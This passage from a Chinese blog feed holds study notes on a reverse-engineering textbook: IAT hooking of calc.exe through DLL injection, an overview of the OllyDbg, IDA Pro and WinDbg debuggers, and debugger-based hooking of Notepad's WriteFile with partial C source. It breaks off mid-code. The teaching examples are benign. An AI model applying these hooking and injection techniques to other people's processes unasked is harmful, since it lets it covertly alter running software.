Table。</p><blockquote><p>如果你尚未掌握PE文件头的结构，或初次接触上面这样的汇编代码，那么很可能不理解代码内容。此时可以同时打开PEView,边参考PE文件结构边调试。其实这不是什么困难的事情，看多了自然就明白了。等以后熟悉了，只要看到[EDI+3C]、[EDI+EAX+80]等代码，也能轻松知道它们是用来跟踪IID Table的代码。</p></blockquote><p>地址1ED10BA处的<code>CALL _stricmp</code>指令用于调用stricmp()函数。通过遍历IID Table比较IID.Name与“user32.dll”字符串，最终查找到user32.dll对应的IID。 在IAT中查找SetWindowTextW API的位置查找到user32.dll对应的IID后，下面的代码用来在IAT中查找SetWindowTextW API的位置（参考图32-29）。然后修改其中的内容，从而实现对API的钩取。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220227140444708.png" alt="图32-29 IAT"></p><p>1ED10D2地址处的<code>CMP DWORD PTR DS:[ESI]，EBX</code>指令中，ESI的值为user32.dll的IAT起始地址，EBP的值为SetWindowTextW的地址（77D2612B）。图32-29的代码运行循环进入IAT，查找位于01001110的SetWindowTextW的地址值（77D2612B）。</p><p><strong>IAT钩取</strong></p><p>图32-30是实际钩取IAT的代码。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220227140818189.png" alt="图32-30 IAT钩取"></p><p>1ED1103地址处的<code>MOV DWORD PTR DS:[ESI]，EAX</code>指令用来将MySetWindowTextW （hooking函数）的地址覆写到前面从IAT中获取的SetWindowTextW的地址（010013F8）。地址010013F8在calc.exe进程中位于user32.dll的IAT区域，该地址原来存储着SetWindowTextW地址（77D2612B）（参考图32-29）。</p><p>执行1ED1103地址处的MOV指令后，user32.SetWindowTextW地址（77D2612B）被更改为hookiat.MySetWindowTextW地址（1ED1000）（参考图32-30）。从现在开始，calc.exe进程代码（通过IAT）调用user32.SetWindowTextW() API时，实际调用的是hookiat.MySetWindowTextW()。</p><h2 id="32-6-3-MySetWindowTextW"><a href="#32-6-3-MySetWindowTextW" class="headerlink" title="32.6.3 MySetWindowTextW()"></a>32.6.3 MySetWindowTextW()</h2><p>完成IAT钩取操作后，在OllyDbg中按F9键正常运行计算器（calc.exe）进程。</p><p>在calc.exe进程中调用user32.SetWindowTextW() API的代码处设置断点，调试hookiat.MySetWindowTextW()函数被调用的情形。首先在调用user32.SetWindowTextW() API的代码处设置断点。使用OllyDbg的Search for All intermodular calls功能，打开如图32-31所示的对话框。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220227141742137.png" alt="图32-31 Search for All intermodular calls对话框"></p><p>可以看到，之前所有的SetWindowTextW函数都成功被Hook成了MySetWindowTextW。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220227142057389.png" alt="图32-32 调用MySetWindowTextW()"></p><p>地址10013F8中原来保存的是user32.SetWindowTextW()的地址，钩取后，存储的地址变为 hookiat.MySetWindowTextW()的地址（1ED1000），如图32-32所示。进入MySetWindowTextW()函数继续调试，岀现图32-33所示的代码。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220227142509646.png" alt="图32-33 调用user32.SetWindowTextW()"></p><p>MySetWindowTextW()函数主要有2个功能，它首先将阿拉伯数字转换为中文数字（字符串）,然后调用原来的 user32.SetWindowTextW() API。1ED1068地址处的 CALL DWORD PTR DS:[g_pOrgFunc]指令就是用来调用user32.SetWindowTextW() API的。1EDEB24地址是hookiat.dll中.data节区的全局变量（g_pOrgFunc）, DllMain()函数会事先将SetWindowTextW的地址存入此处（参考代码32-1、图32-7）。至此，对注入calc.exe进程的hookiat.dll的调试就全部结束了。</p><h1 id="32-7-小结"><a href="#32-7-小结" class="headerlink" title="32.7 小结"></a>32.7 小结</h1><p>IAT钩取是API钩取技术之一，本章详细讲解了该技术的内部工作原理，并通过DLL注入技术将hookiatdll注入目标进程，由此进行API钩取调试练习。理解了这些工作原理与相关概念后，就可以继续下一章的学习。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《逆向工程核心原理》 第32章</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第31章 关于调试器</title>
    <link href="/1999/03/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC31%E7%AB%A0%20%E5%85%B3%E4%BA%8E%E8%B0%83%E8%AF%95%E5%99%A8/"/>
    <url>/1999/03/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC31%E7%AB%A0%20%E5%85%B3%E4%BA%8E%E8%B0%83%E8%AF%95%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>第31章关于调试器<br>调试器（Debugger）是代码逆向分析人员常用的调试工具。<br>本章将讲解目前代码逆向分析领域中常用的调试器。</p><h1 id="31-1-OllyDbg"><a href="#31-1-OllyDbg" class="headerlink" title="31.1 OllyDbg"></a>31.1 OllyDbg</h1><p><a href="http://www.ollydbg.de/">http://www.ollydbg.de</a></p><p>如图31-1所示，OllyDbg是一款免费的调试器，轻量、快速，使用方便。虽然免费，但它仍然拥有强大又多样的功能，且支持插件扩展，得到广大逆向分析人员的青睐。OllyDbg人气很高，使用范围非常广泛，代码逆向分析技术各阶段人员都在使用它。</p><p>OllyDbg的优点是体积轻量，运行快速，提供多样化的功能与众多选项，并且支持插件扩展。由于OllyDbg用户群体庞大，基于OllyDbg的代码逆向分析讲座非常多，所以初学者能够更轻松地学习。还有，它是完全免费的，这也是非常大的优势。</p><p>它的缺点是，由于OllyDbg是个人开发的工具（兴趣使然），其更新速度慢，后续版本的开发周期非常长，目前仅更新到Ver2.0版本。Ver2.0与以前版本相比，用户界面一样，但其内部代码完全重写，运行速度与准确性得到极大提升。可令人遗憾的是，它尚不支持64位系统环境下的调试工作。</p><h1 id="31-2-IDA-Pro"><a href="#31-2-IDA-Pro" class="headerlink" title="31.2 IDA Pro"></a>31.2 IDA Pro</h1><p><a href="http://www.hex-rays.com/idapro">http://www.hex-rays.com/idapro</a></p><p>Hex-rays公司出品的IDA Pro可以说是目前最强大的反汇编器&amp;调试器。以前它具有极其明显的反编译器特征，但通过不断升级、调整，其调试器功能也变得相当强大。IDA Pro拥有庞大又多样的功能，市场中甚至出现了专门介绍的图书。安装反编译插件（Decompiler Plugin）可以为代码逆向分析提供极大便利，这也带动了它的价格。现在许多代码逆向分析专家都将它作为主要的分析工具，作为一款专业的代码逆向分析工具，IDA Pro的霸主地位不可动摇（参考图31-2）。</p><p>IDA Pro的优点是拥有极其丰富的功能，有些你甚至根本不会用到，并且更新及时、专业、完整，但其价格比较昂贵，使用起来比较复杂，初始加载时间也较长。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC31%E7%AB%A0%20%E5%85%B3%E4%BA%8E%E8%B0%83%E8%AF%95%E5%99%A8.assets/image-20220226123811129.png" alt="图31-2 IDA Pro"></p><blockquote><p>IDA Pro是收费软件，但其官方网站上也提供Demo Version与Free Version版本（某些功能受限）供大家免费试用，个人用户可以下载体验。</p></blockquote><h1 id="31-3-WinDbg"><a href="#31-3-WinDbg" class="headerlink" title="31.3 WinDbg"></a>31.3 WinDbg</h1><p><a href="http://www.microsoft.com/whdc/DevTools/Debugging/default.mspx">http://www.microsoft.com/whdc/DevTools/Debugging/default.mspx</a><br>WinDbg是Windows平台下的调试工具，其前身是DOS系统下的16位调试器debug.exe，它是微软对外提供的免费Windows调试器（参考图31-3）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC31%E7%AB%A0%20%E5%85%B3%E4%BA%8E%E8%B0%83%E8%AF%95%E5%99%A8.assets/image-20220226123543633.png" alt="图31-3 Windbg"></p><p>OllyDbg与IDAPro属于用户态调试器，由于功能强大、使用方便，在用户模式调试中占据统治地位。WinDbg既是用户态调试器也是内核态调试器，但主要用于内核模式调试。自从另一个大名鼎鼎的内核级调试工具SoftlCE停止开发后，WinDbg在内核调试领域中成为事实上的霸主（无竞争对手）。WinDbg历史久远，功能丰富而强大，使用方法较为复杂，市面上有专门的讲解图书。</p><p>WinDbg调试器的优点是支持内核级别的调试，并且是微软直接开发的调试器。此外，它还是免费的，支持64位系统下的调试，这些都是它不可或缺的优势。借助它，我们可以直接下载系统文件符号（Symbol），获取系统内结构体（含尚未公开的）及API的相关信息。它还可以用来读取、分析Windows OS的转储文件，帮助分析发生系统崩溃（Crash）的原因。</p><p>虽然WinDbg也提供图形用户界面，但与其他调试器相比却不尽如人意，并不好用（比如，不能直接在代码中输入注释、反汇编代码中调用的API名称显示得不够好等）。尽管如此，WinDbg调试器仍是开发内核驱动与系统维护过程中的必备工具，在代码逆向分析中分析内核驱动文件时也一定会用到。近来，人们进行内核调试时通常会结合使用WinDbg与VirtualPC （或者VMWare）工具。各位的逆向分析技术水平有所提高后，分析内核驱动时会经常用到它。</p><blockquote><p>图31-4是Debug.exe的运行界面，从16位DOS操作系统开始就一直是默认提供的</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC31%E7%AB%A0%20%E5%85%B3%E4%BA%8E%E8%B0%83%E8%AF%95%E5%99%A8.assets/image-20220226123050786.png" alt="图31-4 Debug.exe"></p><p>debug.exe在控制台中通过键盘输入调试，WinDbg拥有与debug.exe相同的用户界面，支持强大的调试命令（我非常喜欢用这种基于控制台命令行的程序，但也有相当多的用户拒绝使用）。</p></blockquote><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《逆向工程核心原理》 第31章</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第30章 记事本WriteFile() API钩取</title>
    <link href="/1999/02/28/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC30%E7%AB%A0%20%E8%AE%B0%E4%BA%8B%E6%9C%ACWriteFile()%20API%E9%92%A9%E5%8F%96/"/>
    <url>/1999/02/28/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC30%E7%AB%A0%20%E8%AE%B0%E4%BA%8B%E6%9C%ACWriteFile()%20API%E9%92%A9%E5%8F%96/</url>
    
    <content type="html"><![CDATA[<p>第30章记事本WriteFile() API钩取<br>本章将讲解前面介绍过的调试钩取技术。通过钩取记事本的kernel32!WriteFile() API，使其执行不同动作。</p><h1 id="30-1-技术图表-调试技术"><a href="#30-1-技术图表-调试技术" class="headerlink" title="30.1 技术图表-调试技术"></a>30.1 技术图表-调试技术</h1><p>下面讲解调试方式的API钩取技术（请参考图30-1技术图表中有下划线的部分）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC30%E7%AB%A0%20%E8%AE%B0%E4%BA%8B%E6%9C%ACWriteFile()%20API%E9%92%A9%E5%8F%96.assets/image-20220225161138711.png" alt="图30-1 技术图表（调试）"></p><p>由于该技术借助“调试”钩取，所以能够进行与用户更具交互性（interctive）的钩取操作。也就是说，这种技术会向用户提供简单的接口，使用户能够控制目标进程的运行，并且可以自由使用进程内存。使用调试钩取技术前，先要了解一下调试器的构造。</p><h1 id="30-2-关于调试器的说明"><a href="#30-2-关于调试器的说明" class="headerlink" title="30.2 关于调试器的说明"></a>30.2 关于调试器的说明</h1><h2 id="30-2-1-术语"><a href="#30-2-1-术语" class="headerlink" title="30.2.1 术语"></a>30.2.1 术语</h2><p>先简单整理一下常用术语。</p><ul><li><p>调试器（Debugger）：进行调试的程序</p></li><li><p>被调试者（Debuggee）：被调试的程序</p></li></ul><h2 id="30-2-2-调试器功能"><a href="#30-2-2-调试器功能" class="headerlink" title="30.2.2 调试器功能"></a>30.2.2 调试器功能</h2><p>调试器用来确认被调试者是否正确运行，发现（未能预料到的）程序错误。调试器能够逐一执行被调试者的指令，拥有对寄存器与内存的所有访问权限。</p><h2 id="30-2-3-调试器的工作原理"><a href="#30-2-3-调试器的工作原理" class="headerlink" title="30.2.3 调试器的工作原理"></a>30.2.3 调试器的工作原理</h2><p>调试进程经过注册后，每当被调试者发生调试事件（DebugEvent）时，OS就会暂停其运行，并向调试器报告相应事件。调试器对相应事件做适当处理后，使被调试者继续运行。 </p><p>□ 一般的异常（Exception）也属于调试事件。 </p><p>□若相应进程处于非调试，调试事件会在其自身的异常处理或OS的异常处理机制中被处理掉。 </p><p>□调试器无法处理或不关心的调试事件最终由OS处理。 </p><p>图30-2形象描述了上述说明。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC30%E7%AB%A0%20%E8%AE%B0%E4%BA%8B%E6%9C%ACWriteFile()%20API%E9%92%A9%E5%8F%96.assets/image-20220225161339958.png" alt="图30-2 调试器工作原理"></p><h2 id="30-2-4-调试事件"><a href="#30-2-4-调试事件" class="headerlink" title="30.2.4 调试事件"></a>30.2.4 调试事件</h2><p>各种调试事件整理如下： </p><p>□ EXCEPTION_DEBUG_EVENT<br>□ CREATE_THREAD_DEBUG_EVENT<br>□ CREATE PROCESS DEBUG EVENT<br>□ EXIT_THREAD_DEBUG_EVENT<br>□ EXIT_PROCESS_DEBUG_EVENT<br>□ LOAD_DLL_DEBUG_EVENT<br>□ UNLOAD_DLL_DEBUG_EVENT<br>□ OUTPUT_DEBUG_STRING_EVENT<br>□ RIP_EVENT</p><p>上面列出的调试事件中，与调试相关的事件为EXCEPTION_DEBUG_EVENT，下面是与其相关的异常列表。</p><p>□ EXCEPTION_ACCESS_VIOLATION<br>□ EXCEPTION_ARRAY_BOUNDS_EXCEEDED<br>□ EXCEPTION_BREAKPOINT<br>□ EXCEPTION_DATATYPE_MISALIGNMENT<br>□ EXCEPTION_FLTDENORMAL_OPERAND<br>□ EXCEPTION_FLT_DIVIDE_BY_ZERO<br>□ EXCEPTION_FLT_INEXACT_RESULT<br>□ EXCEPTION_FLT_INVALID_OPERATION<br>□ EXCEPTION_FLT_OVERFLOW<br>□ EXCEPTION_FLT_STACK_CHECK<br>□ EXCEPTION_FLT_UNDERFLOW<br>□ EXCEPTION_ILLEGAL_INSTRUCTION<br>□ EXCEPTION_IN_PAGE_ERROR<br>□ EXCEPTION_INT_DIVIDE_BY_ZERO<br>□ EXCEPTIONJNT_OVERFLOW<br>□ EXCEPTION_INVALID_DISPOSITION<br>□ EXCEPTION_NONCONTINUABLE_EXCEPTION<br>□ EXCEPTION_PRIV_INSTRUCTION<br>□ EXCEPTION_SINGLE_STEP<br>□ EXCEPTION_STACK_OVERFLOW</p><p>上面各种异常中，调试器必须处理的是EXCEPTION_BREAKPOINT异常。断点对应的汇编指令为INT3, IA-32指令为0xCC。代码调试遇到INT3指令即中断运行，EXCEPTION_BREAKPOINT异常事件被传送到调试器，此时调试器可做多种处理。</p><p>调试器实现断点的方法非常简单，找到要设置断点的代码在内存中的起始地址，只要把1个 字节修改为0xCC就可以了。想继续调试时，再将它恢复原值即可。通过调试钩取API的技术就是利用了断点的这种特性。</p><h1 id="30-3-调试技术流程"><a href="#30-3-调试技术流程" class="headerlink" title="30.3 调试技术流程"></a>30.3 调试技术流程</h1><p>下面详细讲解借助调试技术钩取API的方法。基本思路是，在“调试器-被调试者”的状态下，将被调试者的API起始部分修改为0xCC，控制权转移到调试器后执行指定操作，最后使被调试者重新进入运行状态。</p><p>具体的调试流程如下：</p><p>□对想钩取的进程进行附加操作，使之成为被调试者； </p><p>□ “钩子”：将API起始地址的第一个字节修改为0xCC；  </p><p>□调用相应API时，控制权转移到调试器；</p><p>□执行需要的操作（操作参数、返回值等）； </p><p>□脱钩：将0xCC恢复原值（为了正常运行API）； </p><p>□运行相应API （无0xCC的正常状态）；</p><p>□ “钩子”：再次修改为0xCC （为了继续钩取）；</p><p>□控制权返还被调试者。</p><p>以上介绍的是最简单的情形，在此基础上可以有多种变化。既可以不调用原始API，也可以调用用户提供的客户API； 可以只钩取一次，也可以钩取多次。实际应用时，根据需要适当调整即可。</p><h1 id="30-4-练习"><a href="#30-4-练习" class="headerlink" title="30.4 练习"></a>30.4 练习</h1><p>结合上面学习的内容，我们通过一个示例来练习。该示例钩取Notepad.exe的WriteFile()API，保存文件时操作输入参数，将小写字母全部转换为大写字母。也就是说，在Notepad中保存文件内容时，其中输入的所有小写字母都会先被转换为大写字母，然后再保存。</p><blockquote><p>本示例在Windows XP 32位系统环境下通过测试。</p></blockquote><p>首先运行Notepad.exe，获取其PID，如图30-3所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC30%E7%AB%A0%20%E8%AE%B0%E4%BA%8B%E6%9C%ACWriteFile()%20API%E9%92%A9%E5%8F%96.assets/image-20220226094631826.png" alt="图30-3 Process Explorer"></p><p>运行示例源文件中的钩取程序（hookdbg.exe）。hookdbg.exe是基于控制台的程序，其运行参数为目标进程的PID，如图所示。</p><p>如图30-4所示，运行hookdbg.exe程序后，就开始了对notepad进程（PID为3284）的WriteFile()API的钩取。然后在notepad中随意输入一些英文小写字母，如图30-5所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC30%E7%AB%A0%20%E8%AE%B0%E4%BA%8B%E6%9C%ACWriteFile()%20API%E9%92%A9%E5%8F%96.assets/image-20220226094647261.png" alt="图30-4 运行hookdbg.exe"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC30%E7%AB%A0%20%E8%AE%B0%E4%BA%8B%E6%9C%ACWriteFile()%20API%E9%92%A9%E5%8F%96.assets/image-20220226094736948.png" alt="图30-5 在notepad中输入小写字母"></p><p>完成输入后，保存输入的文本内容，如图30-6所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC30%E7%AB%A0%20%E8%AE%B0%E4%BA%8B%E6%9C%ACWriteFile()%20API%E9%92%A9%E5%8F%96.assets/image-20220226094827281.png" alt="图30-6 保存文件"></p><p>保存文件后，notepad界面中不会有任何变化（请注意前面只是钩取了WriteFile()API）。关闭notepad，查看hookdbg程序的控制台窗口，如图30-7所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC30%E7%AB%A0%20%E8%AE%B0%E4%BA%8B%E6%9C%ACWriteFile()%20API%E9%92%A9%E5%8F%96.assets/image-20220226094846990.png" alt="图30-7 hookdbg.exe运行结果"></p><p>从图30-7中可以看到，“original string”中的部分是原来输入的小写字母，“converted string”中的字符是WriteFile() APl钩取之后经过变换得到的字符串（小写字母→大写字母），这是为了显示hookdbg.exe程序内部的钩取过程而输出的字符串。打开保存的test.txt文件，查看实际文本是否以大写字母形式保存，如图30-8所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC30%E7%AB%A0%20%E8%AE%B0%E4%BA%8B%E6%9C%ACWriteFile()%20API%E9%92%A9%E5%8F%96.assets/image-20220226125618362.png" alt="图30-8 test.txt文件内容"></p><p>从文本内容可知，原来的小写字母全部被转换为大写字母并保存。虽然这个示例功能非常简单，但它能够很好地说明通过调试进行API钩取的技术。</p><h1 id="30-5-工作原理"><a href="#30-5-工作原理" class="headerlink" title="30.5 工作原理"></a>30.5 工作原理</h1><p>为帮助大家理解示例，先讲解其工作原理。假设notepad要保存文件中的某些内容时会调用kernel32!WriteFile() API （先确定一下假设是否正确）。</p><h2 id="30-5-1-栈"><a href="#30-5-1-栈" class="headerlink" title="30.5.1 栈"></a>30.5.1 栈</h2><p>WriteFile()定义（出处：MSDN）如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">WriteFile</span><span class="hljs-params">(</span><br><span class="hljs-params">  [in]                HANDLE       hFile,</span><br><span class="hljs-params">  [in]                LPCVOID      lpBuffer,</span><br><span class="hljs-params">  [in]                DWORD        nNumberOfBytesToWrite,</span><br><span class="hljs-params">  [out, optional]     LPDWORD      lpNumberOfBytesWritten,</span><br><span class="hljs-params">  [in, out, optional] LPOVERLAPPED lpOverlapped</span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>第二个参数（lpBuffer）为数据缓冲区指针，第三个参数（nNumberOfBytesToWrite）为要写的字节数。顺便提醒一下：函数参数被以逆序形式存储到栈。使用OllyDbg工具调试正常运行的notepad，并查看程序栈。</p><blockquote><p>示例中使用的是Windows XP SP3 （32位）中的notepad.exe记事本程序。</p></blockquote><p>如图30-9所示，使用OllyDbg打开notepad后，在Kernel32!WriteFile() API处设置断点，按（F9）键运行程序。在记事本中输入文本后，以合适的文件名保存，如图30-10所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC30%E7%AB%A0%20%E8%AE%B0%E4%BA%8B%E6%9C%ACWriteFile()%20API%E9%92%A9%E5%8F%96.assets/image-20220226100941397.png" alt="图30-9 kernel32.WriteFile()"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC30%E7%AB%A0%20%E8%AE%B0%E4%BA%8B%E6%9C%ACWriteFile()%20API%E9%92%A9%E5%8F%96.assets/image-20220226100733273.png" alt="图30-10 在notepad中输入文本"></p><p>在OllyDbg代码窗口中可以看到，调试器在kernel32!WriteFile()处（设有断点）暂停，然后查看进程栈，如图30-11所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC30%E7%AB%A0%20%E8%AE%B0%E4%BA%8B%E6%9C%ACWriteFile()%20API%E9%92%A9%E5%8F%96.assets/image-20220226101049765.png" alt="图30-11 查看栈中的参数"></p><p>当前栈（ESP:7FA7C）中存在1个返回值（01004C30），ESP+8 （7FA84）中存在数据缓冲区的地址（0E7310）（参考图30-11中的栈窗口）。直接转到数据缓冲区地址处，可以看到要保存到notepad的字符串（“ReverseCore”）（参考上图中的内存窗口）。钩取WriteFile() API后，用指定字符串覆盖数据缓冲区中的字符串即可达成所愿。</p><h2 id="30-5-2-执行流"><a href="#30-5-2-执行流" class="headerlink" title="30.5.2 执行流"></a>30.5.2 执行流</h2><p>我们现在已经知道应该修改被调试进程内存的哪一部分了。接下来，只要正常运行WriteFile()，将修改后的字符串保存到文件就可以了。</p><p>下面我们使用调试方法来钩取API。利用前面介绍的hookdbg.exe，在WriteFile() API起始地址处设置断点（INT3）后，向被调试进程（notepad.exe）保存文件时，EXCEPTION_BREAKPOINT事件就会传给调试器（hookdbg.exe）。那么，此时被调试者（notepad.exe）的EIP值是多少呢？</p><p>乍一想很容易认为是WriteFile() API的起始地址（7C7E0E27）。但其实EIP的值应该为WriteFile()API的起始地址（7C7E0E27）+ 1 &#x3D; 7C7E0E28。</p><p>原因在于，我们在WriteFile() API的起始地址处设置了断点，被调试者（notepad.exe）内部调 用WriteFile()时，会在起始地址7C7E0E27处遇到INT3 （0xCC）指令。执行该指令（Breakpoint - INT3）时，EIP的值会增加1个字节（INT3指令的长度）。然后控制权会转移给调试器（hookdbg.exe） （因为在“调试器-被调试者”关系中，被调试者中发生的EXCEPTION_BREAKPINT异常需要由调试器处理）。修改覆写了数据缓冲区的内容后，EIP值被重新更改为WriteFile()API的起始地址，继续运行。</p><h2 id="30-5-3-“脱钩”-amp-“钩子”"><a href="#30-5-3-“脱钩”-amp-“钩子”" class="headerlink" title="30.5.3 “脱钩” &amp; “钩子”"></a>30.5.3 “脱钩” &amp; “钩子”</h2><p>另一个问题是，若只将执行流返回到WriteFile()起始地址，再遇到相同的INT3指令时，就会陷入无限循环（发生EXCEPTION_BREAKPOINT）。为了不致于陷入这种境地，应该去除设置在WriteFile() API起始地址处的断点，即将0xCC更改为original byte（0x6A） （original byte在钩取API前已保存）。这一操作称为“脱钩”，就是取消对API的钩取。</p><p>覆写好数据缓冲区并正常返回WriteFile() API代码后，EIP值恢复为WriteFile()API的地址，修改后的字符串最终保存到文件。这就是hookdbg.cpp的工作原理。</p><p>若只需要钩取1次，那到这儿就结束了。但如果需要不断钩取，就要再次设置断点。只靠说明是理解不了的，下面结合源代码（hookdbg.cpp）详细讲解。</p><blockquote><p>像OllyDbg这类应用范围很广的调试器，EIP值与设置断点的地址是相同的，并不显示INT3 （0xCC）指令，如图30-11所示。这是OllyDbg为了向用户展示更方便的界面而提供的功能。也就是说，覆写了 INT3（0xCC）之后，若执行该命令，则EIP值增1。此时OllyDbg会将0xCC恢复为原来的字节，并调整EIP （最终的实现算法如上所述）。</p></blockquote><h1 id="30-6-源代码分析"><a href="#30-6-源代码分析" class="headerlink" title="30.6 源代码分析"></a>30.6 源代码分析</h1><p>本节分析hookdbg.cpp源代码。</p><h2 id="30-6-1-main"><a href="#30-6-1-main" class="headerlink" title="30.6.1 main()"></a>30.6.1 main()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><br>LPVOID g_pfWriteFile = <span class="hljs-literal">NULL</span>;<br>CREATE_PROCESS_DEBUG_INFO g_cpdi;<br>BYTE g_chINT3 = <span class="hljs-number">0xCC</span>, g_chOrgByte = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span><br>&#123;<br>    DWORD dwPID;<br><br>    <span class="hljs-keyword">if</span>( argc != <span class="hljs-number">2</span> )<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nUSAGE : hookdbg.exe &lt;pid&gt;\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// Attach Process</span><br>    dwPID = atoi(argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">if</span>( !DebugActiveProcess(dwPID) )<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;DebugActiveProcess(%d) failed!!!\n&quot;</span><br>               <span class="hljs-string">&quot;Error Code = %d\n&quot;</span>, dwPID, GetLastError());<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 调试器循环</span><br>    DebugLoop();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>main()函数的代码非常简单，以程序运行参数的形式接收要钩取API的进程的PID。然后通过DebugActiveProcess()  API（出处：MSDN）将调试器附加到该运行的进程上，开始调试（上面输入的PID作为参数传入函数）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">DebugActiveProcess</span><span class="hljs-params">(</span><br><span class="hljs-params">DWORD dwProcessId</span><br><span class="hljs-params"> <span class="hljs-comment">// process to be debugged</span></span><br><span 